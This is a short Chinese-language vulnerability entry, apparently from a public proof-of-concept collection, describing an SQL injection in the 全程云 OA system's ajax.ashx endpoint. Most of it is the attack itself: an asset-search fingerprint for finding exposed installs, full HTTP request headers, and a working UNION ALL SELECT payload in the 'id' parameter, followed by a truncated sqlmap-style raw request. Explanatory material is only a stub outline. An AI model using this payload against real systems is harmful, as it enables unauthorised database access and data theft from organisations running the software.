# 全程云OAajax存在SQL注入漏洞

- **系统**：全程云　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="全程 OA"`
- **请求**：`POST /OA/common/mod/ajax.ashx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=cfqsbxmiiyoxyl4hvejbfqmi`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 562`

**请求体 / payload**
```
dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=66 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(122)+CHAR(112)+CHAR(122)+CHAR(113)+ISNULL(CAST(111*111 AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rifA

sqlmap
POST /OA/common/mod/ajax.ashx HTTP/1.1
Host: xx.xx.xx.xx
Cookie: ASP.NET_SessionId=cfqsbxmiiyoxyl4hvejbfqmi
Content-Type: application/x-www-form-urlencoded
Content-Length: 562
dl…（脚本共 697 字，完整版见原文）
```

**其他**
- 全程云OA ajax存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 全程云OA